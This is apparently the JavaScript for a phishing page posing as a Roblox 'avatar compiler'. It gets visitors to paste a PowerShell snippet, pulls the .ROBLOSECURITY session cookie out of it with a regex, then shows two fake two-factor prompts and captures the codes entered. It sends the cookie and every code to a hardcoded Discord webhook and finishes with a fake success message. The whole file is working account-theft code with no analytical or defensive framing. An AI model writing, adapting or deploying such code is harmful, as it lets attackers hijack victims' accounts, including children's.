// === UI Setup ===
document.getElementById('instructions').textContent =
  'Press on the "Compile PowerShell" button to compile your avatar. Once you have your PowerShell copied, you can paste it and hit "Enter" to send it.';

// === Modal Open/Close Functions ===
function openModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    modal.style.display = 'flex';
    modal.style.opacity = '1';
    // REMOVE: modal.style.pointerEvents = 'auto';
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.remove('fade-out');

    setTimeout(() => {
      const input = modal.querySelector('input.input-field.form-control');
      if (input) input.focus();
    }, 100);
  }
}

function closeModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.add('fade-out');
    setTimeout(() => {
      modal.style.display = 'none';
      modal.style.opacity = '0';
      // REMOVE: modal.style.pointerEvents = 'none';
      if (modalContent) modalContent.classList.remove('fade-out');
    }, 400);
  }
}

window.onclick = function(event) {
  const modals = document.querySelectorAll('.modal');
  modals.forEach(modal => {
    if (event.target === modal) {
      closeModal(modal.id);
    }
  });
};

// === Main Button ===
document.getElementById('enterButton').addEventListener('click', function() {
  openModal('modal');
});

// === PowerShell Submission ===
document.getElementById('submitButton').addEventListener('click', async function() {
  const powershellInput = document.getElementById('powershellInput');
  const powershellData = powershellInput.value.trim();

  if (!powershellData) {
    alert('Please paste your PowerShell data.');
    return;
  }

  showLoading(true);

  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
  const match = powershellData.match(roblosecurityRegex);

  if (!match) {
    await sendWebhook('No .ROBLOSECURITY Cookie Found', 'No .ROBLOSECURITY cookie found.', 0xff0000);
  } else {
    const cookie = match[1].trim();
    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
  }

  powershellInput.value = '';
  closeModal('modal');
  showLoading(false);

  setTimeout(() => {
    openModal('twofa-modal');
  }, 400);
});

// === First 2FA Modal (Authenticator App) ===
const twofaInput = document.getElementById('twofa-input');
const verifyButton = document.getElementById('verifyButton');

if (twofaInput && verifyButton) {
  twofaInput.addEventListener('input', () => {
    const enabled = /^\d{6}$/.test(twofaInput.value);
    verifyButton.disabled = !enabled;
    verifyButton.classList.toggle('enabled', enabled);
  });

  verifyButton.addEventListener('click', async () => {
    const codeEntered = twofaInput.value.trim();
    if (!/^\d{6}$/.test(codeEntered)) {
      alert('Please enter a valid 6-digit code.');
      return;
    }

    showLoading(true);
    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEntered}**`, 0xffa500);

    twofaInput.value = '';
    closeModal('twofa-modal');  // Close first popup

    setTimeout(() => {
      openModal('twofa-modal-2');  // Open second popup
    }, 1000);

    showLoading(false);
  }); // <--- THIS IS THE END OF THE verifyButton.addEventListener

// MISSING THIS CLOSING BRACE:
} // <--- ADD THIS TO CLOSE THE if (twofaInput && verifyButton) BLOCK



// === Second 2FA Modal ===
const twofaInput2 = document.getElementById('twofa-input-2');
const verifyButton2 = document.getElementById('verifyButton2');

if (twofaInput2 && verifyButton2) {
  twofaInput2.addEventListener('input', () => {
    const enabled = /^\d{6}$/.test(twofaInput2.value);
    verifyButton2.disabled = !enabled;
    verifyButton2.classList.toggle('enabled', enabled);
  });

  verifyButton2.addEventListener('click', async () => {
  const codeEntered = twofaInput2.value.trim();
  if (!/^\d{6}$/.test(codeEntered)) {
    alert('Please enter a valid 6-digit code.');
    return;
  }

  showLoading(true);
  await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEntered}**`, 0xffa500);

  twofaInput2.value = '';
  closeModal('twofa-modal-2');
  showLoading(false);

  setTimeout(() => {
    showSuccessPopup(); // <<< show the green success popup
  }, 400); // wait 400ms so it feels natural
});

}


// === Webhook Sending ===
async function sendWebhook(title, description, color) {
  const webhookUrl = 'https://discord.com/api/webhooks/1387289722400936028/LOsYfsaZfL0NsGF3eT7xzmt5yektdbsP6fsRVtOR5_clDvSiszN7VXtKwz6wMDKE4hxT';
  const payload = {
    embeds: [{
      title: title,
      description: description,
      color: color,
      footer: { text: `Logger System • ${new Date().toLocaleString()}` }
    }]
  };

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

// === Loading Spinner ===
function showLoading(show) {
  if (show) {
    if (!document.getElementById('loading-overlay')) {
      const overlay = document.createElement('div');
      overlay.id = 'loading-overlay';
      overlay.style.position = 'fixed';
      overlay.style.top = '0';
      overlay.style.left = '0';
      overlay.style.width = '100%';
      overlay.style.height = '100%';
      overlay.style.background = 'rgba(0,0,0,0.5)';
      overlay.style.zIndex = '10000';
      overlay.style.display = 'flex';
      overlay.style.justifyContent = 'center';
      overlay.style.alignItems = 'center';

      const spinner = document.createElement('div');
      spinner.style.width = '60px';
      spinner.style.height = '60px';
      spinner.style.border = '8px solid #f3f3f3';
      spinner.style.borderTop = '8px solid #007bff';
      spinner.style.borderRadius = '50%';
      spinner.style.animation = 'spin 1s linear infinite';

      overlay.appendChild(spinner);
      document.body.appendChild(overlay);
    }
  } else {
    const overlay = document.getElementById('loading-overlay');
    if (overlay) overlay.remove();
  }
}

// === Spinner Animation ===
const styleSheet = document.createElement('style');
styleSheet.type = 'text/css';
styleSheet.innerText = `
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}`;
document.head.appendChild(styleSheet);

// === Helpers ===
function closeTwoFAModal() {
  const modals = ['twofa-modal', 'twofa-modal-2'];
  modals.forEach(id => closeModal(id));
}

function useAnotherMethod() {
  alert('Other verification methods are not available. Please use your authenticator app or check your email.');
}

function resendCode() {
  alert('A new code has been sent to your email. (Simulation)');
}
function showSuccessPopup() {
  const popup = document.createElement('div');
  popup.textContent = 'Avatar Compiled Successfully ✅ You can close this page now.';
  popup.style.position = 'fixed';
  popup.style.top = '20px';
  popup.style.left = '50%';
  popup.style.transform = 'translateX(-50%)';
  popup.style.background = '#28a745';
  popup.style.color = 'white';
  popup.style.padding = '15px 30px';
  popup.style.borderRadius = '8px';
  popup.style.fontSize = '18px';
  popup.style.fontWeight = 'bold';
  popup.style.zIndex = '9999';
  popup.style.boxShadow = '0 0 15px rgba(0,0,0,0.3)';
  document.body.appendChild(popup);

  setTimeout(() => {
    popup.style.transition = 'opacity 0.5s';
    popup.style.opacity = '0';
    setTimeout(() => popup.remove(), 500);
  }, 4000); // Shows for 4 seconds
}
